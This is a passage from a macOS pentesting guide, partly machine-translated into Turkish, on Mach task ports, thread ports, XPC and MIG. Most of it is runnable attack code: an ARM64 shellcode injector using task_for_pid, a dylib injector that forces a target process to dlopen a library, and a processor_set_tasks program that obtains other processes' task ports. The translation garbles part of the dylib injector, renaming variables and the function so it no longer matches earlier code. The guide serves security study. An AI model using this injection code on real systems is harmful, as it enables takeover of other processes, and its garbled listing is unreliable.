* **TASK\_PAGED\_LEDGER\_PORT**\[defter gönderme hakkı]: Bu görevin varsayılan bellek yönetilen belleğini çektiği kaynağı adlandıran bağlantı noktası.

### Görev Bağlantı Noktaları

Başlangıçta Mach'ta "işlemler" değil, "görevler" vardı ve bu daha çok bir iş parçacığı konteynırı olarak kabul ediliyordu. Mach, BSD ile birleştirildiğinde **her görev bir BSD işlemiyle ilişkilendirildi**. Bu nedenle her BSD işleminin bir işlem olması için gereken ayrıntılara sahip olması ve her Mach görevinin de iç işleyişi olması (kernel_task olan mevcut pid 0 hariç).

Bununla ilgili iki çok ilginç işlev bulunmaktadır:

* `task_for_pid(hedef_görev_bağlantı_noktası, pid, &pid_li_görev_bağlantı_noktası)`: Belirtilen `pid` ile ilişkilendirilen görevin görev bağlantı noktası için BİRİM hakkı alın ve genellikle `mach_task_self()` kullanan çağrılan görev olan `hedef_görev_bağlantı_noktası`'na verilir (ancak farklı bir görev üzerinde bir BİRİM bağlantı noktası olabilir).
* `pid_for_task(görev, &pid)`: Bir göreve BİRİM hakkı verildiğinde, bu görevin hangi PID ile ilişkili olduğunu bulun.

Görev içinde işlem yapabilmek için görevin kendine `SEND` hakkına ihtiyacı vardı ve `mach_task_self()`'i çağırarak bu izni alıyordu (`task_self_trap` (28) kullanır). Bu izinle bir görev, aşağıdaki gibi çeşitli işlemleri gerçekleştirebilir:

* `task_threads`: Görevin iş parçacıklarının tüm görev bağlantı noktaları üzerinde BİRİM hakkı alın
* `task_info`: Bir görev hakkında bilgi al
* `task_suspend/resume`: Bir görevi askıya al veya devam ettir
* `task_[get/set]_special_port`
* `thread_create`: Bir iş parçacığı oluştur
* `task_[get/set]_state`: Görev durumunu kontrol et
* ve daha fazlası [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) içinde bulunabilir

{% hint style="danger" %}
Farklı bir görevin bir **görev bağlantı noktası üzerinde BİRİM hakkı** ile, farklı bir görev üzerinde bu tür işlemleri gerçekleştirmek mümkündür.
{% endhint %}

Ayrıca, görev\_bağlantı_noktası aynı zamanda **`vm_map`** bağlantı noktasıdır ve `vm_read()` ve `vm_write()` gibi işlevlerle bir görev içinde belleği **okuma ve değiştirme** izni verir. Bu temelde, farklı bir görevin görev\_bağlantı_noktası üzerinde BİRİM haklarına sahip bir görevin, o göreve **kod enjekte etme** yeteneğine sahip olacağı anlamına gelir.

Unutmayın ki **kernel de bir görev olduğundan**, biri **`kernel_task` üzerinde BİRİM izinleri** almayı başarırsa, kernelin herhangi bir şeyi yürütmesini sağlayabilir (jailbreak).

* Çağrı yapmak için `mach_task_self()` ve **çalışan görev için** bu bağlantı noktasının adını alın. Bu bağlantı noktası yalnızca **`exec()`** sırasında **miras alınır**; `fork()` ile oluşturulan yeni bir görev yeni bir görev bağlantı noktası alır (`exec()`'den sonra bir suid ikili dosyada da bir görev yeni bir görev bağlantı noktası alır). Bir görevi başlatmak ve bağlantı noktasını almanın tek yolu, bir `fork()` yaparken ["port takası dansı"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) gerçekleştirmektir.
* Bu, bağlantı noktasına erişim kısıtlamalarıdır (`AppleMobileFileIntegrity` ikilisinden `macos_task_policy`'den):
* Uygulamanın **`com.apple.security.get-task-allow` yetkisi** varsa, aynı kullanıcıdan işlemler **görev bağlantı noktasına erişebilir** (genellikle hata ayıklama için Xcode tarafından eklenir). **Notarizasyon** süreci bunu üretim sürümlerine izin vermez.
* **`com.apple.system-task-ports`** yetkisine sahip uygulamalar, çekirdek hariç olmak üzere **herhangi bir** işlem için **görev bağlantı noktasını alabilir**. Daha eski sürümlerde **`task_for_pid-allow`** olarak adlandırılıyordu. Bu yalnızca Apple uygulamalarına verilir.
* **Root, sertifikalı olmayan** bir çalıştırma zamanıyla derlenmiş uygulamaların görev bağlantı noktalarına **erişebilir** (ve Apple'dan değil).

**Görev adı bağlantı noktası:** _Görev bağlantı noktasının_ ayrıcalıklı olmayan bir sürümüdür. Görevi referans alır, ancak kontrol etmeye izin vermez. Yalnızca `task_info()` aracılığıyla erişilebileceği görülen tek şey budur.

### İş Parçacığı Bağlantı Noktaları

İş parçacıklarının da ilişkili bağlantı noktaları vardır ve bu bağlantı noktaları, **`task_threads`**'i çağıran görev ve `processor_set_threads` ile işlemci tarafından görülebilir. Bir iş parçacığı bağlantı noktasına BİRİM hakkı, `thread_act` alt sistemindeki işlevleri kullanmaya izin verir, örneğin:

* `thread_terminate`
* `thread_[get/set]_state`
* `act_[get/set]_state`
* `thread_[suspend/resume]`
* `thread_info`
* ...

Herhangi bir iş parçacığı, **`mach_thread_sef`**'i çağırarak bu bağlantı noktasını alabilir.

### Görev Bağlantı Noktası Aracılığıyla İş Parçacığına Kabuk Kodu Enjeksiyonu

Kabuk kodunu şuradan alabilirsiniz:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

## İzinler.plist

Bu dosya, uygulamanın sistem kaynaklarına erişim düzeyini belirleyen yetkilendirme bilgilerini içerir. Bu yetkilendirmeler, uygulamanın hangi işlemleri gerçekleştirebileceğini ve hangi sistem kaynaklarına erişebileceğini belirler. Bu dosya, uygulamanın güvenliğini artırmak ve ayrıcalık yükseltme saldırılarını önlemek için önemlidir. 

{% endtab %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

Önceki programı **derleyin** ve aynı kullanıcıyla kod enjekte etmek için **yetkileri** ekleyin (aksi halde **sudo** kullanmanız gerekecektir).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</detaylar>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
{% hint style="success" %}
Bu işlemi iOS'ta çalıştırmak için, yazılabilir bir belleği yürütülebilir hale getirmek için `dynamic-codesigning` yetkisine ihtiyacınız vardır.
{% endhint %}

### Görev bağlantısı aracılığıyla Thread'e Dylib Enjeksiyonu

MacOS'ta **thread'ler**, **Mach** veya **posix `pthread` api** kullanılarak manipüle edilebilir. Önceki enjeksiyonda oluşturduğumuz thread, Mach api kullanılarak oluşturulduğundan **posix uyumlu değildir**.

Bir komutu yürütmek için **basit bir shellcode enjekte etmek mümkündü** çünkü bu, **posix uyumlu api'lerle çalışmaya gerek duymuyordu**, sadece Mach ile çalışıyordu. **Daha karmaşık enjeksiyonlar** için **thread'in** aynı zamanda **posix uyumlu olması** gerekir.

Bu nedenle, **thread'i iyileştirmek** için **`pthread_create_from_mach_thread`** çağrısı yapılmalıdır ki bu da **geçerli bir pthread oluşturacaktır**. Sonrasında, bu yeni pthread, sistemden bir dylib yüklemek için **dlopen**'ı **çağırabilir**, böylece farklı işlemler gerçekleştirmek için yeni shellcode yazmak yerine özel kütüphaneler yüklemek mümkün olacaktır.

Örnek dylib'leri (örneğin bir log oluşturan ve ardından dinleyebileceğiniz bir dylib):

{% content-ref url="../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../macos-library-injection/macos-dyld-hijacking-and-dyld\_insert_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```c
kr  = vm_protect(uzakGorev, uzakKod64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Uzak iş parçacığının kodu için bellek izinlerinin ayarlanamadı: Hata %s\n", mach_error_string(kr));
return (-4);
}

// Ayrılan yığın belleğinin izinlerini ayarla
kr  = vm_protect(uzakGorev, uzakYığın64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Uzak iş parçacığının yığını için bellek izinlerinin ayarlanamadı: Hata %s\n", mach_error_string(kr));
return (-4);
}


// Shellcode'u çalıştırmak için iş parçacığı oluştur
struct arm_unified_thread_state uzakThreadState64;
thread_act_t         uzakThread;

memset(&uzakThreadState64, '\0', sizeof(uzakThreadState64) );

uzakYığın64 += (STACK_SIZE / 2); // bu gerçek yığın
//uzakYığın64 -= 8;  // 16'lık hizalamaya ihtiyaç var

const char* p = (const char*) uzakKod64;

uzakThreadState64.ash.flavor = ARM_THREAD_STATE64;
uzakThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
uzakThreadState64.ts_64.__pc = (u_int64_t) uzakKod64;
uzakThreadState64.ts_64.__sp = (u_int64_t) uzakYığın64;

printf ("Uzak Yığın 64  0x%llx, Uzak kod %p\n", uzakYığın64, p );

kr = thread_create_running(uzakGorev, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &uzakThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &uzakThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Uzak iş parçacığı oluşturulamadı: hata %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Kullanım: %s _pid_ _aksiyon_\n", argv[0]);
fprintf (stderr, "   _aksiyon_: diskteki bir dylib dosyasının yolu\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *aksiyon = argv[2];
struct stat buf;

int rc = stat (aksiyon, &buf);
if (rc == 0) enjekteEt(pid,aksiyon);
else
{
fprintf(stderr,"Dylib bulunamadı\n");
}

}
```
</detaylar>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Görev Bağlantısı Yoluyla İş Parçacığı Kaçırma <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Bu teknikte, işlemin bir iş parçacığı ele geçirilir:

{% content-ref url="macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

### Görev Bağlantısı Enjeksiyonu Tespiti

`task_for_pid` veya `thread_create_*` çağrıldığında, çekirdekten gelen task yapısındaki bir sayaç artar ve bu, task\_info(task, TASK\_EXTMOD\_INFO, ...) çağrılarak kullanıcı modundan erişilebilir.

## İstisna Bağlantıları

Bir iş parçacığında bir istisna meydana geldiğinde, bu istisna iş parçacığının belirlenmiş istisna bağlantısına gönderilir. İş parçacığı bunu ele almazsa, görev istisna bağlantılarına gönderilir. Görev bunu ele almazsa, yöneticisi launchd tarafından yönetilen ana bağlantı noktasına gönderilir (burada kabul edilir). Buna istisna triyajı denir.

Genellikle sonunda, eğer rapor düzgün bir şekilde ele alınmazsa, rapor sonunda ReportCrash daemon tarafından ele alınır. Bununla birlikte, aynı görevdeki başka bir iş parçacığının istisnayı yönetmesi mümkündür, bu da `PLCrashReporter` gibi çökme raporu araçlarının yaptığı şeydir.

## Diğer Nesneler

### Saat

Herhangi bir kullanıcı saat hakkında bilgiye erişebilir, ancak zamanı ayarlamak veya diğer ayarları değiştirmek için kök kullanıcı olmak gerekir.

Bilgi almak için `clock` alt sistemi fonksiyonları çağrılabilir, örneğin: `clock_get_time`, `clock_get_attributtes` veya `clock_alarm`\
Değerleri değiştirmek için `clock_priv` alt sistemi, `clock_set_time` ve `clock_set_attributes` gibi fonksiyonlarla kullanılabilir.

### İşlemciler ve İşlemci Kümesi

İşlemci API'leri, tek bir mantıksal işlemciyi kontrol etmeye olanak tanır ve `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment` gibi fonksiyonları çağırarak etkileşimde bulunabilir...

Ayrıca, **işlemci kümesi** API'leri, birden fazla işlemciyi bir grup içine gruplamak için bir yol sağlar. Varsayılan işlemci kümesini almak için **`processor_set_default`** çağrılabilir.\
İşlemci kümesi ile etkileşimde bulunmak için bazı ilginç API'ler şunlardır:

* `processor_set_statistics`
* `processor_set_tasks`: İşlemci kümesi içindeki tüm görevlere gönderme hakları dizisini döndürür
* `processor_set_threads`: İşlemci kümesi içindeki tüm iş parçacıklarına gönderme hakları dizisini döndürür
* `processor_set_stack_usage`
* `processor_set_info`

[**Bu yazıda**](https://reverse.put.as/2014/05/05/about-the-processor\_set\_tasks-access-to-kernel-memory-vulnerability/) belirtildiği gibi, geçmişte bu, diğer işlemlerdeki görev bağlantılarını elde etmek için önceki korumayı atlamak için **`processor_set_tasks`** çağrısını yaparak kontrol etmeyi sağladı.\
Günümüzde bu işlevi kullanmak için kök kullanıcı olmanız gerekir ve bu nedenle korumalıdır, bu nedenle korumasız işlemlerde yalnızca bu bağlantı noktalarını alabilirsiniz.

Deneyebilirsiniz:

<details>

<summary><strong>processor_set_tasks kodu</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:

{% content-ref url="macos-xpc/" %}
[macos-xpc](macos-xpc/)
{% endcontent-ref %}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:

{% content-ref url="macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## References

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [\*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
